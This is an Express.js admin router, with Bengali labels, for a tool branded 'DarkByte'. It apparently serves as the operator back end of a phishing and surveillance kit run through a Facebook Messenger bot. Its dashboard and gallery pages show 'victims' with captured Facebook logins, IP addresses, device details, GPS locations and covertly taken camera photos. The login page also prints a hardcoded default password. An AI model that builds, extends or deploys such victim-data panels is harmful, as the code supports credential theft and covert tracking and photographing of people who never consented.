const express = require('express');
const router = express.Router();
const Config = require('../models/Config');
const User = require('../models/User');
const Victim = require('../models/Victim');

// ============================
// অ্যাডমিন লগইন চেক (মিডলওয়্যার)
// ============================
async function isAdmin(req, res, next) {
    if (req.session.isAdmin) return next();
    res.redirect('/admin');
}

// ============================
// লগইন পেজ
// ============================
router.get('/admin', async (req, res) => {
    if (req.session.isAdmin) return res.redirect('/admin/dashboard');
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>অ্যাডমিন লগইন</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
            <style>
                body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
                .login-card { max-width: 400px; width: 100%; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
            </style>
        </head>
        <body>
            <div class="card login-card p-4 p-md-5">
                <h3 class="text-center fw-bold mb-4">🔐 অ্যাডমিন লগইন</h3>
                ${req.query.error ? '<div class="alert alert-danger">ভুল পাসওয়ার্ড!</div>' : ''}
                <form method="POST" action="/admin/login">
                    <div class="mb-3">
                        <input type="password" name="password" class="form-control form-control-lg" placeholder="পাসওয়ার্ড দিন" required>
                    </div>
                    <button type="submit" class="btn btn-primary w-100 btn-lg">লগইন</button>
                </form>
                <div class="mt-3 text-center text-muted small">ডিফল্ট পাসওয়ার্ড: Sakib@7890</div>
            </div>
        </body>
        </html>
    `);
});

router.post('/admin/login', async (req, res) => {
    const config = await Config.findOne({ key: 'bot_config' });
    const adminPass = config ? config.adminPassword : 'Sakib@7890';
    if (req.body.password === adminPass) {
        req.session.isAdmin = true;
        res.redirect('/admin/dashboard');
    } else {
        res.redirect('/admin?error=1');
    }
});

router.get('/admin/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/admin');
});

// ================================================================
// ১. ড্যাশবোর্ড (ছবি সহ)
// ================================================================
router.get('/admin/dashboard', isAdmin, async (req, res) => {
    const config = await Config.findOne({ key: 'bot_config' });
    const totalUsers = await User.countDocuments();
    const allowedUsers = await User.countDocuments({ allowed: true });
    const totalVictims = await Victim.countDocuments();
    const victims = await Victim.find().sort({ timestamp: -1 }).limit(30);
    const users = await User.find().sort({ firstSeen: -1 }).limit(30);
    const baseUrl = config?.baseUrl || 'http://localhost:3000';
    const msg = req.query.msg || '';
    const error = req.query.error || '';

    // ইউজার টেবিল
    let userRows = users.map(u => `
        <tr>
            <td><code>${u.fbId}</code></td>
            <td>${u.firstName || 'N/A'}</td>
            <td>${new Date(u.firstSeen).toLocaleDateString()}</td>
            <td>${u.messageCount || 0}</td>
            <td><span class="badge ${u.allowed ? 'bg-success' : 'bg-danger'}">${u.allowed ? '✅ অনুমোদিত' : '❌ বাতিল'}</span></td>
            <td>
                <form method="POST" action="/admin/toggle-user" class="d-inline">
                    <input type="hidden" name="userId" value="${u.fbId}">
                    <input type="hidden" name="action" value="${u.allowed ? 'deny' : 'allow'}">
                    <button class="btn btn-sm ${u.allowed ? 'btn-warning' : 'btn-success'}">${u.allowed ? 'বাতিল' : 'অনুমোদন'}</button>
                </form>
            </td>
        </tr>
    `).join('');

    // ভিক্টিম টেবিল (ছবি সহ)
    let victimRows = victims.map(v => {
        // সর্বশেষ ছবি
        const lastImage = v.camera && v.camera.length > 0 ? v.camera[v.camera.length - 1].image : null;
        const imgTag = lastImage 
            ? `<img src="data:image/jpeg;base64,${lastImage}" style="width:60px;height:60px;object-fit:cover;border-radius:8px;border:1px solid #ddd;" />` 
            : '<span class="text-muted">❌ নেই</span>';
        
        return `
            <tr>
                <td><code>${v.id}</code></td>
                <td><span class="badge ${v.type === 'fb' ? 'bg-info' : v.type === 'location' ? 'bg-success' : 'bg-primary'}">${v.type === 'fb' ? '🔐 লগইন' : v.type === 'location' ? '📍 লোকেশন' : '📸 ক্যামেরা'}</span></td>
                <td>${v.ip || 'N/A'}</td>
                <td>${v.device?.platform || v.device?.userAgent?.split('(')[1]?.split(')')[0] || 'N/A'}</td>
                <td>${v.location?.city || v.gpsLocation?.latitude ? '📍 হ্যাঁ' : '❌ না'}</td>
                <td>${v.camera?.length || 0}</td>
                <td>${imgTag}</td>
                <td>
                    <a href="/admin/victim/${v.id}" class="btn btn-sm btn-outline-primary">📸 দেখুন</a>
                </td>
                <td>${new Date(v.timestamp).toLocaleDateString()}</td>
            </tr>
        `;
    }).join('');

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>অ্যাডমিন প্যানেল</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
            <style>
                body { background: #f8f9fa; }
                .sidebar { background: #2c3e50; min-height: 100vh; padding-top: 20px; }
                .sidebar a { color: #ecf0f1; text-decoration: none; display: block; padding: 12px 20px; border-radius: 8px; transition: 0.3s; }
                .sidebar a:hover, .sidebar a.active { background: #34495e; }
                .sidebar a i { margin-right: 12px; width: 20px; }
                @media (max-width: 768px) { .sidebar { min-height: auto; padding: 10px; } .sidebar a { display: inline-block; padding: 8px 15px; margin: 2px; } }
                .stat-card { background: white; border-radius: 12px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border-left: 5px solid #f58220; }
                .stat-card .number { font-size: 28px; font-weight: bold; }
                .table-responsive { background: white; border-radius: 12px; padding: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
                .img-thumb { width: 60px; height: 60px; object-fit: cover; border-radius: 8px; }
            </style>
        </head>
        <body>
            <div class="container-fluid p-0">
                <div class="row g-0">
                    <!-- সাইডবার -->
                    <div class="col-md-2 sidebar">
                        <div class="text-center text-white mb-4">
                            <h5>🛠️ DarkByte</h5>
                            <small class="text-muted">অ্যাডমিন প্যানেল</small>
                        </div>
                        <a href="/admin/dashboard" class="active"><i class="bi bi-house"></i> ড্যাশবোর্ড</a>
                        <a href="#config-section" class="scroll-link"><i class="bi bi-gear"></i> কনফিগ</a>
                        <a href="#users-section" class="scroll-link"><i class="bi bi-people"></i> ইউজার</a>
                        <a href="#victims-section" class="scroll-link"><i class="bi bi-eye"></i> ভিক্টিম</a>
                        <a href="/admin/logout"><i class="bi bi-box-arrow-right"></i> লগআউট</a>
                    </div>

                    <!-- কন্টেন্ট -->
                    <div class="col-md-10 p-3 p-md-4">
                        ${msg ? `<div class="alert alert-success">✅ ${msg}</div>` : ''}
                        ${error ? `<div class="alert alert-danger">❌ ${error}</div>` : ''}

                        <h2 class="mb-4">📊 ড্যাশবোর্ড</h2>
                        <div class="row g-3 mb-4">
                            <div class="col-6 col-md-3"><div class="stat-card"><div class="number">${totalUsers}</div><div>মোট ইউজার</div></div></div>
                            <div class="col-6 col-md-3"><div class="stat-card"><div class="number">${allowedUsers}</div><div>অনুমোদিত</div></div></div>
                            <div class="col-6 col-md-3"><div class="stat-card"><div class="number">${totalVictims}</div><div>মোট ভিক্টিম</div></div></div>
                            <div class="col-6 col-md-3"><div class="stat-card"><div class="number">${victims.reduce((s, v) => s + (v.camera?.length || 0), 0)}</div><div>ছবি ক্যাপচার</div></div></div>
                        </div>

                        <!-- কনফিগ -->
                        <div id="config-section" class="card mb-4">
                            <div class="card-header bg-dark text-white"><i class="bi bi-gear"></i> কনফিগারেশন</div>
                            <div class="card-body">
                                <form method="POST" action="/admin/update-config">
                                    <div class="row">
                                        <div class="col-md-6 mb-3">
                                            <label class="form-label">পেজ অ্যাক্সেস টোকেন</label>
                                            <input type="text" class="form-control" name="pageAccessToken" value="${config?.pageAccessToken || ''}" placeholder="PAGE_ACCESS_TOKEN">
                                        </div>
                                        <div class="col-md-6 mb-3">
                                            <label class="form-label">ভেরিফাই টোকেন</label>
                                            <input type="text" class="form-control" name="verifyToken" value="${config?.verifyToken || 'Sakib_Verify'}" placeholder="VERIFY_TOKEN">
                                        </div>
                                        <div class="col-md-6 mb-3">
                                            <label class="form-label">বেস URL</label>
                                            <input type="text" class="form-control" name="baseUrl" value="${config?.baseUrl || baseUrl}" placeholder="https://your-domain.com">
                                        </div>
                                        <div class="col-12">
                                            <button type="submit" class="btn btn-primary"><i class="bi bi-save"></i> কনফিগ সেভ</button>
                                        </div>
                                    </div>
                                </form>
                                <div class="mt-2"><code>📌 ওয়েবহুক URL: ${baseUrl}/webhook</code></div>
                            </div>
                        </div>

                        <!-- ইউজার -->
                        <div id="users-section" class="card mb-4">
                            <div class="card-header bg-dark text-white"><i class="bi bi-people"></i> ইউজার ম্যানেজমেন্ট</div>
                            <div class="card-body table-responsive">
                                <table class="table table-striped table-hover">
                                    <thead><tr><th>FB ID</th><th>নাম</th><th>প্রথম</th><th>মেসেজ</th><th>স্ট্যাটাস</th><th>অ্যাকশন</th></tr></thead>
                                    <tbody>${userRows || '<tr><td colspan="6" class="text-center">কোনো ইউজার নেই</td></tr>'}</tbody>
                                </table>
                            </div>
                        </div>

                        <!-- ভিক্টিম (ছবি সহ) -->
                        <div id="victims-section" class="card">
                            <div class="card-header bg-dark text-white"><i class="bi bi-eye"></i> ভিক্টিম ডেটা (সর্বশেষ ৩০টি)</div>
                            <div class="card-body table-responsive">
                                <table class="table table-striped table-hover">
                                    <thead>
                                        <tr>
                                            <th>আইডি</th>
                                            <th>টাইপ</th>
                                            <th>আইপি</th>
                                            <th>ডিভাইস</th>
                                            <th>লোকেশন</th>
                                            <th>ছবি</th>
                                            <th>প্রিভিউ</th>
                                            <th>অ্যাকশন</th>
                                            <th>সময়</th>
                                        </tr>
                                    </thead>
                                    <tbody>${victimRows || '<tr><td colspan="9" class="text-center">কোনো ভিক্টিম নেই</td></tr>'}</tbody>
                                </table>
                                <small class="text-muted">📌 "দেখুন" ক্লিক করলে ওই ভিক্টিমের সব ছবি দেখতে পাবেন।</small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <script>
                document.querySelectorAll('.scroll-link').forEach(link => {
                    link.addEventListener('click', function(e) {
                        e.preventDefault();
                        const target = document.querySelector(this.getAttribute('href'));
                        if (target) target.scrollIntoView({ behavior: 'smooth' });
                    });
                });
            </script>
        </body>
        </html>
    `);
});

// ================================================================
// ২. ভিক্টিমের সব ছবি দেখানো (Gallery View)
// ================================================================
router.get('/admin/victim/:id', isAdmin, async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('ভিক্টিম পাওয়া যায়নি');
        }

        // ছবিগুলোকে কার্ডে সাজানো
        let imagesHtml = '';
        if (victim.camera && victim.camera.length > 0) {
            victim.camera.forEach((cam, index) => {
                imagesHtml += `
                    <div class="col-md-3 col-sm-4 col-6 mb-3">
                        <div class="card h-100">
                            <img src="data:image/jpeg;base64,${cam.image}" class="card-img-top" style="height:200px;object-fit:cover;" alt="ছবি ${index+1}" />
                            <div class="card-body p-2 text-center">
                                <small class="text-muted">ছবি #${index+1}</small><br>
                                <small class="text-muted">${new Date(cam.timestamp).toLocaleString()}</small>
                            </div>
                        </div>
                    </div>
                `;
            });
        } else {
            imagesHtml = '<div class="col-12"><p class="text-center text-muted">❌ এই ভিক্টিমের কোনো ছবি নেই</p></div>';
        }

        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>ভিক্টিমের ছবি - ${victim.id}</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
                <style>
                    body { background: #f8f9fa; padding: 20px; }
                    .header { background: #2c3e50; color: white; padding: 15px 20px; border-radius: 12px; margin-bottom: 20px; }
                    .header a { color: #ecf0f1; text-decoration: none; }
                    .header a:hover { color: #f58220; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header d-flex justify-content-between align-items-center">
                        <div>
                            <h4 class="mb-0">📸 ভিক্টিমের ছবি</h4>
                            <small>আইডি: <code>${victim.id}</code> | মোট: ${victim.camera?.length || 0}টি ছবি</small>
                        </div>
                        <a href="/admin/dashboard" class="btn btn-light btn-sm"><i class="bi bi-arrow-left"></i> ড্যাশবোর্ডে ফিরুন</a>
                    </div>

                    <div class="row">
                        ${imagesHtml}
                    </div>

                    <div class="mt-3">
                        <a href="/admin/dashboard" class="btn btn-secondary"><i class="bi bi-arrow-left"></i> ড্যাশবোর্ডে ফিরুন</a>
                    </div>
                </div>
            </body>
            </html>
        `);
    } catch (err) {
        console.error('Victim gallery error:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

// ================================================================
// ৩. POST রাউটস
// ================================================================
router.post('/admin/update-config', isAdmin, async (req, res) => {
    try {
        let config = await Config.findOne({ key: 'bot_config' });
        if (!config) config = new Config({ key: 'bot_config' });
        config.pageAccessToken = req.body.pageAccessToken || '';
        config.verifyToken = req.body.verifyToken || 'Sakib_Verify';
        config.baseUrl = req.body.baseUrl || '';
        await config.save();
        res.redirect('/admin/dashboard?msg=কনফিগ+সেভ+হয়েছে');
    } catch (err) {
        res.redirect('/admin/dashboard?error=সেভ+ব্যর্থ');
    }
});

router.post('/admin/toggle-user', isAdmin, async (req, res) => {
    try {
        const { userId, action } = req.body;
        const user = await User.findOne({ fbId: userId });
        if (user) {
            user.allowed = (action === 'allow');
            await user.save();
        }
        res.redirect('/admin/dashboard?msg=ইউজার+আপডেট+হয়েছে');
    } catch (err) {
        res.redirect('/admin/dashboard?error=আপডেট+ব্যর্থ');
    }
});

module.exports = router;